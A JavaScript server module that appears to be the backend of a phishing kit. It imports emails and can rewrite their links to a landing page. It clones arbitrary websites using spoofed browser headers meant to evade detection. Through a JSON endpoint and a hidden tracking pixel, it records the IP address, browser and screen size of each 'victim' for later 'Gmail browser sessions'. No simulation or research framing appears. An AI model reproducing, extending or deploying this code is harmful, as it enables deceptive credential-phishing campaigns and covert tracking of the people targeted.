const { simpleParser } = require('mailparser');
const axios = require('axios');
const cheerio = require('cheerio');

const importEmail = async (req, res) => {
  try {
    const { content, convert_links } = req.body;
    if (!content) {
      return res.status(400).json({ message: 'No Content Specified!' });
    }

    // Use simpleParser to parse the email content
    const parsed = await simpleParser(content);

    // Optionally rewrite links if convert_links is true
    if (convert_links) {
      const rewriteLinks = (input) => {
        return input.replace(/http:\/\/\S+/g, 'https://your-landing-page.com');
      };
      if (parsed.html) parsed.html = rewriteLinks(parsed.html);
      if (parsed.text) parsed.text = rewriteLinks(parsed.text);
    }

    return res.json({
      message: 'Email imported successfully',
      subject: parsed.subject || "",
      html: parsed.html || "",
      text: parsed.text || ""
    });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ message: 'Error importing email', error: err.message });
  }
};

const extract = async (req, res) => {
  const { url } = req.body;
  
  // Validate URL
  if (!url) {
    return res.status(400).json({ message: 'URL is required' });
  }

  // Add http:// prefix if missing
  let fullUrl = url;
  if (!fullUrl.startsWith('http://') && !fullUrl.startsWith('https://')) {
    fullUrl = 'https://' + fullUrl;
  }
  
  try {
    console.log(`Attempting to fetch content from: ${fullUrl}`);
    
    // More comprehensive browser-like headers to avoid detection
    const headers = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Cache-Control': 'no-cache',
      'Pragma': 'no-cache',
      'Sec-Ch-Ua': '"Not A(Brand";v="99", "Google Chrome";v="121", "Chromium";v="121"',
      'Sec-Ch-Ua-Mobile': '?0',
      'Sec-Ch-Ua-Platform': '"Windows"',
      'Sec-Fetch-Dest': 'document',
      'Sec-Fetch-Mode': 'navigate',
      'Sec-Fetch-Site': 'none',
      'Sec-Fetch-User': '?1',
      'Upgrade-Insecure-Requests': '1',
      'Referer': 'https://www.google.com/'
    };
    
    // Attempt to fetch with enhanced headers
    const response = await axios.get(fullUrl, {
      headers,
      timeout: 15000, // 15 seconds timeout
      maxRedirects: 5
    });

    let html = response.data;
    if (!html) {
      throw new Error('Received empty response from URL');
    }

    // Load HTML into cheerio for manipulation
    const $ = cheerio.load(html);

    // Remove all script tags to exclude JavaScript
    $('script').remove();

    // Fetch and inline external CSS
    try {
      console.log('Fetching external stylesheets...');
      const linkTags = $('link[rel="stylesheet"]');
      const fetchPromises = [];
      let fetchedStyles = 0;
      
      // Create a timeout promise
      const timeoutPromise = new Promise((_, reject) => {
        setTimeout(() => reject(new Error('Assets fetch timeout')), 5000);
      });

      linkTags.each(function() {
        const link = $(this);
        let href = link.attr('href');
        if (!href) return;

        // Resolve relative URLs based on the provided URL
        let absoluteUrl;
        try {
          absoluteUrl = new URL(href, fullUrl).href;
        } catch (e) {
          console.error(`Invalid URL: ${href}`);
          return;
        }

        // Create a promise that resolves regardless of success/failure
        const fetchPromise = axios.get(absoluteUrl, { headers, timeout: 5000 })
          .then(cssResponse => {
            // Replace the link tag with an inline style tag
            link.replaceWith(`<style>${cssResponse.data}</style>`);
            fetchedStyles++;
            console.log(`Fetched CSS from ${absoluteUrl}`);
          })
          .catch(err => {
            console.error(`Failed to fetch CSS from ${absoluteUrl}:`, err.message);
            link.remove(); // Remove failed CSS links
          });

        fetchPromises.push(fetchPromise);
      });

      // Also process inline styles in style tags
      $('style').each(function() {
        const styleTag = $(this);
        // Extract any @import statements and fetch those stylesheets
        const styleContent = styleTag.html();
        if (styleContent) {
          const importMatches = styleContent.match(/@import\s+url\(['"]?([^'")]+)['"]?\)/g);
          if (importMatches) {
            importMatches.forEach(importMatch => {
              const urlMatch = importMatch.match(/@import\s+url\(['"]?([^'")]+)['"]?\)/);
              if (urlMatch && urlMatch[1]) {
                const importUrl = urlMatch[1];
                try {
                  const absoluteImportUrl = new URL(importUrl, fullUrl).href;
                  const fetchPromise = axios.get(absoluteImportUrl, { headers, timeout: 5000 })
                    .then(cssResponse => {
                      // Add the imported CSS to the style tag content
                      const newContent = styleContent.replace(importMatch, cssResponse.data);
                      styleTag.html(newContent);
                      fetchedStyles++;
                    })
                    .catch(err => {
                      console.error(`Failed to fetch imported CSS from ${absoluteImportUrl}:`, err.message);
                      // Remove the @import line that failed
                      const newContent = styleContent.replace(importMatch, '');
                      styleTag.html(newContent);
                    });
                  fetchPromises.push(fetchPromise);
                } catch (e) {
                  console.error(`Invalid import URL: ${importUrl}`);
                  // Remove the invalid @import line
                  const newContent = styleContent.replace(importMatch, '');
                  styleTag.html(newContent);
                }
              }
            });
          }
        }
      });

      // Wait for all CSS fetches to complete or timeout after 5 seconds
      try {
        await Promise.race([
          Promise.allSettled(fetchPromises),
          timeoutPromise
        ]);
      } catch (error) {
        if (error.message === 'Assets fetch timeout') {
          console.log('Asset fetching timed out after 5 seconds, proceeding with partial content');
        }
      }
      console.log(`Fetched ${fetchedStyles} stylesheets`);
    } catch (cssError) {
      console.error('Error processing CSS:', cssError.message);
      // Continue with the HTML we have even if CSS processing fails
    }

    // Transform relative URLs to absolute
    $('a').each(function() {
      const href = $(this).attr('href');
      if (href && !href.startsWith('http') && !href.startsWith('#')) {
        try {
          const absoluteUrl = new URL(href, fullUrl).href;
          $(this).attr('href', absoluteUrl);
        } catch (e) {
          // If URL parsing fails, leave as is
        }
      }
    });

    // Transform image sources to absolute
    $('img').each(function() {
      const src = $(this).attr('src');
      if (src && !src.startsWith('http') && !src.startsWith('data:')) {
        try {
          const absoluteSrc = new URL(src, fullUrl).href;
          $(this).attr('src', absoluteSrc);
        } catch (e) {
          // If URL parsing fails, leave as is
        }
      }
    });

    // Add base tag to help resolve remaining relative URLs
    $('head').prepend(`<base href="${fullUrl}">`);

    return res.json({ 
      html: $.html(),
      title: $('title').text() || '',
      originalUrl: fullUrl
    });
    
  } catch (error) {
    console.error('Error extracting from URL:', error);
    let errorMessage = 'Error extracting from URL';
    let statusCode = 500;
    
    // Provide more specific error messages
    if (error.code === 'ENOTFOUND') {
      errorMessage = 'Could not resolve the domain name. Please check the URL.';
    } else if (error.code === 'ECONNREFUSED') {
      errorMessage = 'Connection refused. The server may be down or blocking requests.';
    } else if (error.code === 'ETIMEDOUT' || error.response?.status === 408) {
      errorMessage = 'Request timed out. The server took too long to respond.';
    } else if (error.response?.status === 403) {
      statusCode = 403;
      errorMessage = 'This website is blocking our access. It has anti-scraping protection that prevents automatic content extraction.';
    } else if (error.response?.status === 404) {
      statusCode = 404;
      errorMessage = 'Page not found. The URL may be incorrect.';
    } else if (error.response?.status === 429) {
      statusCode = 429;
      errorMessage = 'Too many requests. The website is rate-limiting our access.';
    }
    
    // Suggest alternatives for 403 errors
    let suggestions = [];
    if (error.response?.status === 403) {
      suggestions = [
        "Try a different website that doesn't have strong anti-scraping protection.",
        "For this specific site, you may need to manually copy and paste the content."
      ];
    }
    
    return res.status(statusCode).json({ 
      message: errorMessage,
      error: error.message,
      url: fullUrl,
      suggestions: suggestions.length > 0 ? suggestions : undefined
    });
  }
};

const captureScreenData = async (req, res) => {
  try {
    const screenData = req.body;
    const ip = req.ip || req.connection.remoteAddress;
    const userAgent = req.get('User-Agent');
    
    console.log('📐 Screen data captured from victim:', {
      ip,
      screenWidth: screenData.screenWidth,
      screenHeight: screenData.screenHeight,
      userAgent: userAgent
    });
    
    // Store screen data for future Gmail browser sessions
    // You could store this in a database or cache for later use
    global.victimScreenData = global.victimScreenData || {};
    global.victimScreenData[ip] = {
      ...screenData,
      ip,
      capturedAt: new Date()
    };
    
    res.json({ success: true, message: 'Screen data captured' });
    
  } catch (error) {
    console.error('Error capturing screen data:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

const trackScreen = async (req, res) => {
  try {
    // Handle GET request with query parameters (image pixel method)
    const screenData = req.query;
    const ip = req.ip || req.connection.remoteAddress;
    
    console.log('📐 Screen data tracked from victim (pixel method):', {
      ip,
      screenWidth: screenData.screenWidth,
      screenHeight: screenData.screenHeight
    });
    
    // Store screen data
    global.victimScreenData = global.victimScreenData || {};
    global.victimScreenData[ip] = {
      ...screenData,
      ip,
      capturedAt: new Date()
    };
    
    // Return a 1x1 transparent pixel
    const pixel = Buffer.from('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==', 'base64');
    res.setHeader('Content-Type', 'image/png');
    res.send(pixel);
    
  } catch (error) {
    console.error('Error tracking screen:', error);
    res.status(500).json({ success: false, error: error.message });
  }
};

module.exports = {
  importEmail,
  extract,
  captureScreenData,
  trackScreen
};